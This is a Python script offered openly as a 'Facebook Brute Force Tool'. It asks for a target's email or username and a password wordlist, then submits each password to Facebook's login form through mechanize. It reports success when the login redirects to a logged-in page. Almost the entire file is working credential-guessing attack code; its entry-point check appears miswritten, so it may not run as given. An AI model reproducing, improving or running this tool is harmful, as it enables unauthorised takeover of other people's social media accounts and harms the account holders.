# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~+
# Created By: clarisha octa    |
# dont forget to follow me     |
# Facebook Brute Force Tool    |
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~+

# -------------------
# Importing Libraries
# -------------------
import mechanize
import cookielib
import random
import sys
import time
import os
from mechanize import Browser

# -----------
# CLARISHA OCTA
# -----------
HEADER = '\033[95m'
OKBLUE = '\033[94m'
MUKIDI = '\033[92m'
WARNING = '\033[93m'
NGENTOT = '\033[91m'
ENDC = '\033[0m'
JABLAY = '\033[1m'
UNDERLINE = '\033[4m'

# NGEWE
def octa():
	os.system('clear && clear')

def slowly(s):
	try:
		octa()
		time.sleep(2)
		for w in s + '\n' :
			sys.stdout.write(w)
			sys.stdout.flush()
			time.sleep(10. / 100)
		print('\n')
		time.sleep(2)
	except KeyboardInterrupt:
		time.sleep(1)
		octa()
		print(NGENTOT+'Exiting =)')
		print('\n')
		sys.exit(0)
slowly(JABLAY+"FaceBrute.py ::: Started ::: "+ENDC)

# ---------
# Starting
# ---------
def clarisha():
	try:
		
		br = Browser() # Super Hidden Browser
		c = cookielib.LWPCookieJar() # Variable For CookiesJar 
		# Other Options Must Be Set 
		br.set_handle_robots(False)
		br.set_handle_equiv(True)
		br.set_handle_referer(True)
		br.set_handle_redirect(True)
		br.set_cookiejar(c) # Seting Up Cookies
		br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1) # Refresh
		headers = [("User-agent",'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:15.0) Gecko/20100101 Firefox/15.0.1' )] 
		br.addheaders = headers	# Seting Up User-Agent
		user_name = raw_input( 'Enter UserName / Email >> ')
		wordlist = raw_input('Enter Passwords List >> ')
		try:
			open(wordlist,'r')
		except IOError:
			octa()
			print(NGENTOT+'No Such File or Directory >> %s'%(wordlist)+ENDC)
			print('\n')
			clarisha()
		octa()
		wordlist = open(wordlist, 'r') # Opening Passwords List in Read Mode 
		for password in wordlist: # Taking Each Password on the List
			password = password.rstrip('\n')
			br.open('https://www.facebook.com/login.php') # Open Login Facebook URL
			# Seting Some Option ('HTML Options') 
			br.select_form(nr=0)
			br.form['email'] = user_name
			br.form['pass'] = password
			br.submit()
			url = br.geturl()
			if url == 'https://www.facebook.com/login.php' or url == 'https://www.facebook.com/login.php?login_attempt=1&lwv=100':
				print(NGENTOT + 'Password Not Correct %s'%(password))
			elif url == 'https://www.facebook.com/' or url == 'https://www.facebook.com/?sk=welcome' or url == 'https://www.facebook.com/checkpoint/?next':
				print('\n')
				print('+------------------------------------------|')
				print(' | Password Found : %s'%(MUKIDI+password+ENDC) +  '|')
				print('+------------------------------------------|')
				print('\n')
				exit(0)

	except KeyboardInterrupt:
		time.sleep(1)
		octa()
		print(NGENTOT+'Exiting =)')
		print('\n')
		sys.exit(0)

if __name__ == "__clarisha__":
	clarisha()
